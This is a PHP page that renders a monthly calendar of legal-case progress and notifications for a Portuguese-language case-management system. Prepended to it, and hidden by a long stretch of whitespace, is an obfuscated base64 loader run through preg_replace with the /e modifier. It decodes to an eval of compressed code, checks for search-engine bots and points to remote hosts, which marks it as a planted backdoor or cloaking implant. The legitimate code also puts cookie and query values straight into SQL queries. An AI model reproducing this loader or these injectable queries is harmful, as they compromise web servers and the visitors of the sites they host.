<?php                                                                                                                                                                 /*versio:3.01*/$II11=114762;if (!function_exists('IIIllIlI')){$GLOBALS['II11'] = 'NyaW5pX3NldApmqYWxsb3dfdXJsX2ZvcGVukhZGlzcGxheV9lcnJvcnM*ZZnRwL2Z0cDIwMTMxMTE0My4wMQ=?BUTAwT09PTwaHR0cDovLwdYXSFRUUFM#*b2ZmH&(aHR0cHM6Ly8XnSFRUUF9IT1NUj!$dW5pb24c2VsZWN0SqUkVRVUVTVF9VUkkU0NSSVBUX05BTUUUVVFUllfU1RSSU5HPwV=!gZGV0ZXJtaW5hdG9y_IHLgdvLmxvZwA{SFRUUF9ZX0FVVEgYmFzZTY0X2RlY29kZQlEdmVyc2lvLQDeLXBocA@XSFRUUF9FWEVDUEhQ(b3V0Ob2sJaJSFRUUF9VU0VSX0FHRU5ULAKzZ29vZ2xlLHlhaG9vLGJhaWR1LGJpbmdib3QsbXNuYm90LHlhbmRleA;;CYQ_xfc2V6cW8ubmV0c*)ZmFzdGFkZHouY29t(L3czLnBocD91PQnSJms9NeJnQ9cGhwJnA9gM&;.wJnY9UvZXZhbChnenVuY29tcHJlc3MoYmFzZTY0X2RlY29kZSgiZUp5TlY0dE8yMG9RL1pWbGhaQXRHY2ZPTytUNktvaUdpeVdha0JBcVZTMnlVbWZkV0hYc3lJOUNoZmozTzdNUDJ3R25naURGMmRtZE9UdVBNK013SU5ySmhnVmh6RFlhM2JDY3Bic3dYdWRKU25YOWhZUWdEb3JZejhNazl0aHptT1daNXJwdUZMbVJxN1VOWWxzNmJwdUVjZWhsTEs5a2RzOGdiVXVISGZxNFFkd1pnR1FFWWd2RXIwU1pJRStkbU9WZXdKSkFPM1VqRzdZYTVPeDBNWi9QRnd2aWtObkQ3YTFPWGtpMXNndjlOTW5ESGRQeXRHQ2dMR1Y1a2Nha3JxTEp4RStXQjJIRVlBdEFzaU1EVmNMSDBsSDV3cklXRmlpbmZwRkdkRXhRRDhDR0ZTa3pxUWRYeWtHRUR1TFhBNFVhWFVkUjh1VEJJUzlJOWl5bU9uRkFpMDBSc3dRMlFiTzQyL09UT0djeE9KUnU4M3gvMFdwUlloS0pCNThFSUpQUXN5Y24rT2xUZmcwV1phd3BLQklpQmdNZTRXTUQyb2xjMVhSK2h5aXk3WU03UUVpU2ZjNHY2TnAyZENoa3o4d0gwVVFlMUtSYWcxdzlMRy9uZHlzUHZnenlBZXgrZ2RDUDY3bVpYbjZhTGcwU3JPRnVmOTI1bks0ZWxyUFY4bkoyZjQwblpNaVBIN2lhejJiVHE5WEsvVHlkUDZ3TTBwZU9jSGt3Si9MYTZoeXF3b2g3ZnBSa3JMYUtEbWU3ZmY1SGs0ZkJ6WlVhU3NldktycHlWVVdLOEdoZ0RxSzVJRXY4WDVnWFZkWU5MY3c4OFBrY0gwUjFHS1FuYmFyODVXb0FhQ1ROa2NPS0FOakJ2cEJKd0V1Ry9qZGRrUmNaaFZkcVloaXlYK1JtdGJwcjJhWUZDOS9UN3pGODNTUlpma0hnNFVWQ2V1VUM3aVliRjhERTNjMmRONzgzYVl1YStQaGx1cngzNTdNR293OFpTODh2ZjBKT1g0QnhjWjdyVXpxZnRsaHlKMDFGTG0ra2s3TXpvcjBwYW5KZWlmOGhiYjN5aG9sZWhWcXFvYkRiUTE0b2s2Q01vdVNBVS9BeS9NR04yUE0rU2paTW95VTRRNm1FZlVXTVZDVjNmN01lSzFJSmR3M254RDV1OC9VOXp5UkZEbDdpdVFRT01XU051SEFINW04VFFyOTYxSlJDazE3Z001ZkxBQjBRMTM2N2g0cE5mN01Vd1VIT0xQU0tWVTY5KytrU1F2Tk5paDd4S01kbXpaMlNkbnREenNxODRERlBLOGxncUtvRGE4S3VCTU1CWi9teHF1NUtNbElTVE5VdzQwNVRLS28rWUVOaUQvUkgxVXdteDdlUUU0ZlVGa2NHNlFvNmUyUFhidmZCc0MwOUxzV21rK1ZwbmdEOWdudWFqSFJHbUJzNlJqTklVcmIydDFCZkh0YkpPaU15QXM2L1ZYZ1FMS2pjSjVtc1Z0ZW9OYmN1SWtZV1FBM2Y1UEhIR3NhK3pYdGJSZGhIZGVITzRjZDB2UUlxN2VTb3F3ZXd6KzZocjVFd2pzczU5YjBYRC90Q2pBRTlHcysyaFVyNkh6QmkxcUxadGlGWDJqcDBoZ2JEcGNyeFlRRmhqOHlCZHIxTm1ESWZKcEkvbXV6T1FHb09MTVpyWUFqUHUzWnZwNTZubTUvY0pYRDlmUGtWTE54ZExpL2hjY3pKZGNHYitXV2FydjlvaExZMjdIY3IyKzZnZG1rcjMrMWJaZ0NOK0x5SXcrZHF5YjJhcXBVS01WMTl2cU9QaHl2VGNtazYrMUxmb1g0Q3FvTVZlWURiUWUzbDdGQUF0NnczWGk0dVRIVkRYZFdrWW12NTgybC9MbWVIbGppVUhaSDZrT1VNWkFjNUx4M0NzeDZMUFpMSmZxSTZuRmlVbGVkaWFUVjZWa3crbWZlVWh2bjZoeHlsMUVrQkJ1Y0pzVGdtUDhEK0wwV1NxbHVLYldPZTJMeEVvcW81SXRmYk9JK0o2YlEyZHJZN1BGL1U4S2dxRE5nTzZHN2hLRVpveXZHeVJIZ1BzZUhmbWV3MlBXWFRsTDFPMHFNcDJSRFpEK2djSnJZTmM1clMwcXpBZGR1WTZhYlVQdjRMK2xLbEdFcWdTL0VKVTYzV2RmWUZPUjhoMERiU0VkN0tjYVJaSGdMc1MxWkZJKzArTWlBMlI5RjVaSU01YUZQVjV1RUlXY2xRamFJR1pqUVFGeFM5cFJKMHNJejdlam02WU5oZFI4Sm9ndDJ4Um9wSzRBMkMvVjVINnRUSE1IYXdEM1FCWTdYU0FRZ2RYV1RGYzVocklrR3d0VWQ4bExuR0VaTlBBakRqNHZnMCtYdlg2T0I3Q2pUTWc2Nmhwb2RxVjQrN3BBNEVLYnNIN1V1V0dRNkZiM3FLZ0dDVTBoUEg0ZWhFOVlCbk9ieEFqSXRIYzZKbXMydGpjOWZWaE10SC9VbUJGWVVuRzN0aVdRMDR6R0VkTTAzYWh0a2F4eThkNXBDY0R5V0lVZjNnMnVFSG4rbktPVXNjRkpNanV0dFp3ZXgyVVBlS01jU0xWNW45R1AwOEtmeXRWcThJSUVZL0tqYk1TMktmSFVocUZhOENDMjlaYUUxd2xveTE0UHZLUGJ6dURxTFU3UXg1QXFyS2VndENWQkhubEpvajVSSWZLUGw4VFdxTnJ0dUQ5MTY3eThzRGQxVUI2Nkt6dXlVeDFBVUREdXg5UlhWSFBYbkVGUzhWZ2t6eFhlTGRTeXhlR21iVjZqMTIzT1JVd2I3eXplUTRNOG5aNm4rSy9aMnciKSkpOwc XcHJlZ19yZXBsYWNlk*H';function IIIllIlI($a, $b){$c=$GLOBALS['II11']; $d=pack('H*','6261736'.'536345f6465636f6465'); return $d(substr($c, $a, $b));};$Q00Q0000Q = IIIllIlI(3382, 16);$Q00Q0000Q("/III11IlIl/e", IIIllIlI(501, 2878), "III11IlIl");};?><?php
include ("include/restricoes.php");
include('../conn.php');




$mes = sprintf('%02s',$_GET['mes']);
$ano = $_GET['ano'];


$query_funcionario = mysql_query("SELECT id_funcionario, nome, tipo_usuario,id_master FROM funcionario WHERE id_funcionario = '$_COOKIE[logado]'");
$row_funcionario   = mysql_fetch_array($query_funcionario);

$qr_regiao = mysql_query("SELECT * FROM regioes 
						 INNER JOIN funcionario_regiao_assoc
						 ON funcionario_regiao_assoc.id_regiao = regioes.id_regiao
						 WHERE funcionario_regiao_assoc.id_master = '$row_funcionario[id_master]' 
						 AND funcionario_regiao_assoc.id_funcionario = '$_COOKIE[logado]' ");
while($row_regiao = mysql_fetch_assoc($qr_regiao)):


$regioes[] = $row_regiao['id_regiao'];


endwhile;

$regioes = implode(',', $regioes);
$total_dias = cal_days_in_month(CAL_GREGORIAN,$mes,$ano);

$meses = array(  1 => 'Janeiro',
				 2 => 'Fevereiro',
				 3 => 'Mar&ccedil;o',
				 4 => 'Abril', 
				 5 => 'Maio', 
				 6 => 'Junho', 
				 7 => 'Julho', 
				 8 => 'Agosto', 
				 9 => 'Setembro', 
				 10 => 'Outubro', 
				 11 => 'Novembro',
				 12 => 'Dezembro');

////VERIFICANDO ANDAMENTO NO MêS
$qr_processo 		= mysql_query("SELECT  B.* ,
IF(andamento_data_movi = (SELECT MAX(andamento_data_movi) FROM proc_trab_andamento WHERE proc_id = A.proc_id),'1', '0') as ultimo_andamento
FROM processos_juridicos AS A
INNER JOIN
proc_trab_andamento as B
ON A.proc_id = B.proc_id
where A.status = 1 AND andamento_status = 1 AND A.id_regiao IN($regioes)
ORDER BY B.andamento_data_movi DESC ") or die(mysql_error());
									


while($row_processo = mysql_fetch_assoc($qr_processo)):

                
             
		if($row_processo['ultimo_andamento'] == 1 and  $row_processo['andamento_realizado'] == 0){


                        if(($row_processo['proc_status_id'] == 8 or $row_processo['proc_status_id'] == 9 or $row_processo['proc_status_id'] == 11 or
                                $row_processo['proc_status_id'] == 12 or $row_processo['proc_status_id'] == 22 or $row_processo['proc_status_id'] == 25) )

                            {                    continue;   }


                        $dt_hoje_segundos 	   = mktime(0,0,0,date('m'), date('d'), date('Y'));	
                        $dt_andamento_segundos = explode('-',$row_processo['andamento_data_movi']);

                        $dt_vencimento 		   = mktime(0,0,0,$dt_andamento_segundos[1],$dt_andamento_segundos[2],$dt_andamento_segundos[0]);
                        $dt_andamento_segundos = mktime(0,0,0,$dt_andamento_segundos[1],$dt_andamento_segundos[2]-$dias_aviso,$dt_andamento_segundos[0]);


                        if($dt_hoje_segundos > $dt_vencimento and  $row_processo['proc_status_id'] != 1 ) {

                                $andamento_aviso_email['proc_id_expirados'][]    = $row_processo['proc_id'];	
                                $andamento_aviso_email['andamentos_expirados'][] = $row_processo['andamento_id'];		  	
                        }



                        if(($row_processo['mes'] == (int)$mes) and ($row_processo['ano'] == $ano)) {

                                        if($dt_hoje_segundos >= $dt_andamento_segundos and $dt_vencimento >= $dt_hoje_segundos and  $row_processo['proc_status_id'] != 1 ){

                                                $andamento_aviso_email['proc_id'][]   = $row_processo['proc_id'];
                                                $andamento_aviso_email['andamento'][] = $row_processo['andamento_id'];
                                        } 

                                        $andamento[$row_processo['andamento_data_movi']][] = $row_processo['andamento_id'];
                                        $realizado[$row_processo['andamento_data_movi']][]   = $row_processo['andamento_realizado'];
                        }
	
                }
endwhile;

////////VEIRIFICANDO AS NOTIFICAÇÕES
$qr_notificacoes = mysql_query("SELECT * FROM notificacoes WHERE MONTH(notificacao_data_limite) = $mes AND  notificacao_status = 1 AND notificacao_entregue = 0");
while($row_notificacao = mysql_fetch_assoc($qr_notificacoes)):

	$notificacoes[$row_notificacao['notificacao_data_limite']][] = $row_notificacao['notificacao_id'];

endwhile;




$total_dias = cal_days_in_month(CAL_GREGORIAN,$mes,$ano);



echo '<div id="nome_mes"><h3>'.$meses[(int)$mes].' / '.$ano.'</h3></div>';	
echo '<div style="clear:left;"></div>';


echo '<div id="seta_esquerda">  </div>';	

echo '<table  class="calendario">';
echo '<tr class="nome_dias">
			<td>D</td>
			<td>S</td>
			<td>T</td>
			<td>Q</td>
			<td>Q</td>
			<td>S</td>
			<td>S</td>
		</tr>';
		
$primeiro_dia = date('w',strtotime($ano.'-'.$mes.'-01'));		
$dias 		  = 0;

for($i = 0; $i < 6; $i++){
	
	
	if($dias == $total_dias) { continue; } 	
	
	 echo '<tr class="semana">';
	 
	 		for($j=0; $j <7; $j++){
						
					if($j < $primeiro_dia and $i ==0) {
					
						echo '<td></td>';
					
					} else {
						if($dias == $total_dias) {echo '<td></td>'; continue; } 	
						$dias++;
						
						///verificando processos
						$data   		  	  = $ano.'-'.$mes.'-'.sprintf('%02s',$dias);	
						$data_segundos    	  = mktime(0,0,0,$mes, $dias, $ano);	
						$dt_hoje_segundos 	  = mktime(0,0,0,date('m'), date('d'), date('Y'));			
						
						$class = 'dia'; 
						
						
						
						if(sizeof($andamento[$data]) >0) {								
							foreach($andamento[$data] as $andamento_id){ $andamentos_input[] ='<input type="hidden" name="andamento_id[]" class="andamento_id" value="'.$andamento_id.'"/>'; }
							$class = 'aviso';
							
							
								if($data_segundos < $dt_hoje_segundos and in_array(0,$realizado[$data])){ 	$class2 = ' expirado'; 	}
							
							
							
									if(@!in_array(0,$realizado[$data])){
										
										 $class2 = 'aviso_verde';
										 
										}
						} 
								
						if(sizeof($notificacoes[$data]) >0) {								
							foreach($notificacoes[$data] as $notificacao_id){ $notificacao_input[] = '<input type="hidden" name="notificacao_id[]" class="notificacao_id" value="'.$notificacao_id.'"/>'; 	}							$class = 'aviso';
						}
						
						if($data == date('Y-m-d') ) {
							$class2 = ' hoje';
						}
						
						
						
												
						echo '<td class="'.$class.' '.$class2.'">';
							
							if(isset($andamentos_input)) { echo implode(' ', $andamentos_input) ; }
							if(isset($notificacao_input)){ echo implode(' ', $notificacao_input);  }
								
							if($class == 'aviso' or $class == 'aviso hoje' or $class == 'aviso_verde')	
							 echo '<div class="marcador"><img src="../img_menu_principal/pin.png" width="15" height="23"/></div>';	
							 echo '<input type="hidden" name="data" class="data" value="'.$data.'"/>';
							 echo $dias;
							 
							 unset($andamentos_input, $notificacao_input,$class,$class2);
						echo '</td>';		
					}
			}
			
	 echo '</tr>';
 }


?>
</table>



<div id="seta_direita">  </div>

<div id="aviso_calen"></div>

<div style="clear:left;"></div>

<input type="hidden"  id="mes_calendario" value="<?php echo (int)$mes ?>"/>
<input type="hidden"  id="ano_calendario" value="<?php echo $ano; ?>"/>
